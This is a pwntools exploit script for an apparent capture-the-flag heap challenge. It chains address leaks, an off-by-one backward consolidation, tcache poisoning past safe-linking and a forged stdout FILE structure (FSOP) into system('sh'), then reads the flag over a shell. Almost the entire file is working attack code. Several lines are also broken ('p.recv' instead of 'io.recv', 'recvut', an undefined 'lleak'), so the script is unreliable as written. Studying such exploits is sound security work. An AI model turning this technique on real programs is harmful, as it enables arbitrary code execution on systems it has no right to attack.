#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = "./limit_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

def malloc(idx, size):
    sla(b'> ', b'1')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(size).encode())

def free(idx):
    sla(b'> ', b'2')
    sla(b'Index: ', str(idx).encode())

def puts(idx):
    sla(b'> ', b'3')
    sla(b'Index: ', str(idx).encode())

def read(idx, data):
    sla(b'> ', b'4')
    sla(b'Index: ', str(idx).encode())
    sla(b'Data: ', data)
io = start()

malloc(0, 0x18)
malloc(1, 0x18)
free(1)
free(0)
malloc(0, 0x18)
malloc(1, 0x18)
puts(1)
recvunt(b"Data: ")
heap_base = (u64(io.recv(5).ljust(8, b"\x00"))) << 12
info("heap base:" +  hex(heap_base))

# backward consolidation
for i in range(9):
    malloc(i, 0xf8)
malloc(9, 0x18) # prevent top consolidation
for i in range(7): # fill up 0x100 tcache
    free(i)

## set up fake main_arena + off by one
payload = flat(
    p64(heap_base + 0xa00) + p64(heap_base + 0xa00), # fwd/bk point to fake main_arena
    b"A" * 0x10 + p64(0) * 2,
    p64(heap_base + 0x9d0) + p64(heap_base + 0x9d0), # fake main_arena point back to chunk
    b"B" * 0xb0,
    p64(0x100) # fake prev_size
    )
read(7, payload)
free(8) # consolidate chunk[8] -> chunk[7] (now chunk[7] is in unsortedbin but still in use)

## leak libc
puts(7)
recvunt(b"Data: ")
libc_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x203b20
info("libc base: "+ hex(libc_base))

# make duplicate chunk
for i in range(7):
    malloc(i, 0xf8)
malloc(15, 0xf8) # reallocate chunk[7] -> chunk[7] and chunk[15] now are the same ptr (but different size) (size[7] = 0xf8, size[15] = 0x78)

# leak ld base
free(0)
free(7)
# [tcache 0x100]: chunk[7] -> chunk[0]
target = libc_base - 0x1df0 # this address hold ld value (_rtld_global + 2736) (stable in local and remote)
mgl_ptr = target ^ ((heap_base + 0x9e0) >> 12)
read(15, p64(mgl_ptr))
# [tcache 0x100]: chunk[7] -> target -> (_rtld_global + 2736) ^ (target >> 12)
malloc(7, 0xf8)
# [tcache 0x100]: target -> (_rtld_global + 2736) ^ (target >> 12)
malloc(0, 0xf8)
# [tcache 0x100]: (_rtld_global + 2736) ^ (target >> 12)
free(7)
# [tcache 0x100]: chunk[7] -> (_rtld_global + 2736) ^ (target >> 12)
puts(15)
recvunt(b"Data: ")
leak_val = u64(p.recv(6).ljust(8, b"\x00")) ^ ((heap_base + 0x9e0) >> 12)
ld_base = (leak_val ^ (target >> 12)) - 0x38ab0
info("ld base: " + hex(ld_base))
malloc(7, 0xf8) # return to first heap layout

# leak code base
# same approach with leak ld base
free(1)
free(7)
target = ld_base + 0x39660 # this address hold PIE value (stable in local and remote)
mgl_ptr = target ^ ((heap_base + 0x9e0) >> 12)
read(15, p64(mgl_ptr))
malloc(7, 0xf8)
malloc(1, 0xf8)
free(7)
puts(15)
recvut(b"Data: ")
leak_val = u64(p.recv(6).ljust(8, b"\x00")) ^ ((heap_base + 0x9e0) >> 12)
code_base = (leak_val ^ (target >> 12)) - 0x658
lleak("code base: ", code_base)
malloc(7, 0xf8)

# tcache poisoning (aim for chunks[] array since it below heap region)
free(2)
free(7)
# [tcache 0x100]: chunk[7] -> chunk[2]
target = code_base + 0x4040 # chunks[] array
mgl_ptr = target ^ ((heap_base + 0x9e0) >> 12)
read(15, p64(mgl_ptr))
# [tcache 0x100]: chunk[7] -> &chunks
malloc(7, 0xf8)
malloc(0, 0xe8) # make sizes[0] > 0
malloc(2, 0xf8) # now chunk[2] = &chunks
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
read(2, p64(_IO_2_1_stdout_)) # now chunk[0] = stdout

# overwrite stdout -> fsop (copy straight from personal note)
system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
read(0, payload)

sleep(1)
sl(b"cat flag.txt")

io.interactive()
